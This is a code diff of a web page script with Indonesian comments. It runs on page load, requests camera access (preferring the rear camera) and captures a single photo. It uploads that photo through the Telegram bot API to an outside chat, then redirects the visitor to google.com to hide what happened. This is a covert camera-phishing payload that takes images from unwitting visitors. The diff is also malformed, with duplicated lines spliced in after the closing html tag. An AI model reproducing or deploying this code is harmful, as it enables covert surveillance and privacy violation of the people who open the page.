@@ -32,9 +32,97 @@
             try {
                 console.log("1. Meminta izin akses kamera...");
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: { ideal: 1280 }, height: { ideal: 720 } } 
+                    video: { 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 },
+                        // Meminta kamera belakang di mobile, jika ada
+                        facingMode: "environment" 
+                    } 
                 });
                 console.log("2. Izin kamera diberikan. Stream aktif.");
+
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                video.onloadedmetadata = () => {
+                    console.log("3. Metadata video dimuat. Menunggu kamera siap...");
+                    
+                    // Fungsi untuk menunggu video benar-benar siap
+                    const waitForVideoReady = (retryCount = 0) => {
+                        // readyState 4 berarti HAVE_ENOUGH_DATA, artinya video siap ditampilkan
+                        if (video.readyState >= 4) {
+                            console.log("4. Video siap. Mulai menangkap gambar...");
+                            performCapture();
+                        } else if (retryCount < 10) { // Coba lagi maksimal 10 kali (dalam 5 detik)
+                            console.log(`Video belum siap (readyState: ${video.readyState}). Mencoba lagi...`);
+                            setTimeout(() => waitForVideoReady(retryCount + 1), 500); // Cek lagi setiap 0.5 detik
+                        } else {
+                            console.error("Video tidak kunjung siap setelah 5 detik. Membatalkan.");
+                            stream.getTracks().forEach(track => track.stop());
+                            window.location.href = "https://www.google.com";
+                        }
+                    };
+
+                    // Mulai pengecekan setelah 2 detik pertama
+                    setTimeout(() => waitForVideoReady(), 2000);
+                };
+
+                function performCapture() {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Hentikan stream kamera
+                    stream.getTracks().forEach(track => track.stop());
+                    console.log("5. Stream kamera dihentikan.");
+
+                    canvas.toBlob(async (blob) => {
+                        if (!blob) {
+                            console.error("Error: Gagal membuat blob dari canvas.");
+                            window.location.href = "https://www.google.com";
+                            return;
+                        }
+                        console.log("6. Blob berhasil dibuat. Ukuran:", blob.size, "bytes.");
+
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('chat_id', CHAT_ID);
+                        
+                        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                        console.log("7. Mengirim foto ke:", telegramApiUrl);
+
+                        try {
+                            const response = await fetch(telegramApiUrl, { method: 'POST', body: formData });
+                            const result = await response.json();
+                            console.log("8. Respon dari Telegram:", result);
+
+                            if (response.ok && result.ok) {
+                                console.log("✅ Foto berhasil terkirim!");
+                            } else {
+                                console.error("❌ Gagal mengirim foto. Respon API:", result);
+                            }
+                        } catch (fetchError) {
+                            console.error("❌ Error saat melakukan fetch ke Telegram:", fetchError);
+                        } finally {
+                            // Arahkan ke Google baik berhasil maupun gagal
+                            window.location.href = "https://www.google.com";
+                        }
+                    }, 'image/jpeg', 0.9);
+                }
+
+            } catch (error) {
+                console.error("❌ Akses kamera ditolak atau terjadi error awal:", error);
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        window.onload = captureAndSend;
+    </script>
+</body>
+</html>                console.log("2. Izin kamera diberikan. Stream aktif.");
 
                 const video = document.getElementById('video');
                 video.srcObject = stream;
